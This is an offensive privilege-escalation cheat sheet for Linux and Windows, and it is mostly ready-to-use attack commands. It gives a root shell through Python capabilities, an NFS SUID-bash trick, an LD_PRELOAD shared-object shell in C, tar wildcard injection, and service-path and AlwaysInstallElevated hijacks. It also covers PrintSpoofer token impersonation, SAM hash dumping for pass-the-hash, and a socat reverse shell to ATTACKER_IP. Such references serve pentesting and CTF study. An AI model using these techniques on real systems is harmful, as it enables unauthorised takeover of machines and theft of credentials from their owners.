# Advanced Privilege Escalation Cheatsheet

## Linux

### Capabilities
Capabilities allow binaries to perform specific root actions without being SUID.
- **Check:** `getcap -r / 2>/dev/null`
- **Exploit (e.g., python with cap_setuid):**
  `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

### Sudo Tokens (Reuse)
If `ptrace` is allowed, you can steal a sudo token from another process.
- **Check:** `cat /proc/sys/kernel/yama/ptrace_scope` (Should be 0)
- **Tool:** https://github.com/nongiach/sudo_inject

### NFS Root Squashing
If `/etc/exports` has `no_root_squash`, you can mount the share locally as root and create a SUID binary.
1. On attacker: `mount -o rw,vers=2 TARGET_IP:/share /tmp/mnt`
2. On attacker: `cp /bin/bash /tmp/mnt/rootbash; chmod +s /tmp/mnt/rootbash`
3. On target: `/share/rootbash -p`

### LD_PRELOAD
If `sudo -l` shows `env_keep+=LD_PRELOAD`:
1. Create `shell.c`:
   ```c
   #include <stdio.h>
   #include <sys/types.h>
   #include <stdlib.h>
   void _init() {
       unsetenv("LD_PRELOAD");
       setgid(0);
       setuid(0);
       system("/bin/sh");
   }
   ```
2. Compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
3. Run: `sudo LD_PRELOAD=/tmp/shell.so <COMMAND>`

### Cron Jobs
- **Writable Script:** If a cron job runs a script you can write to, replace it with a reverse shell.
- **Wildcard Injection:** If cron runs `tar *`, create files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`.

## Windows

### Unquoted Service Paths
If a service path contains spaces and is unquoted (e.g., `C:\Program Files\My Service\service.exe`), Windows looks for:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
...
- **Check:** `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
- **Exploit:** Place a malicious binary at `C:\Program Files\My.exe`.

### AlwaysInstallElevated
Allows any user to run MSI files as SYSTEM.
- **Check:**
  `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- **Exploit:** Generate MSI payload with msfvenom and run `msiexec /quiet /qn /i payload.msi`.

### Token Impersonation (SeImpersonatePrivilege)
If you have `SeImpersonatePrivilege` (common in IIS/SQL Service accounts):
- **Tools:** JuicyPotato, RottenPotato, PrintSpoofer.
- **Command:** `PrintSpoofer.exe -i -c cmd`

### SAM & SYSTEM Hives
If you have read access to `C:\Windows\System32\config\` (or backups):
1. Copy `SAM` and `SYSTEM`.
2. Extract hashes: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
3. Pass-the-Hash.

## General

### Reverse Shells (Stabilization)
**Python:**
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`Ctrl+Z`
`stty raw -echo; fg`
`export TERM=xterm`

**Socat:**
Attacker: `socat file:`tty`,raw,echo=0 tcp-listen:4444`
Target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`
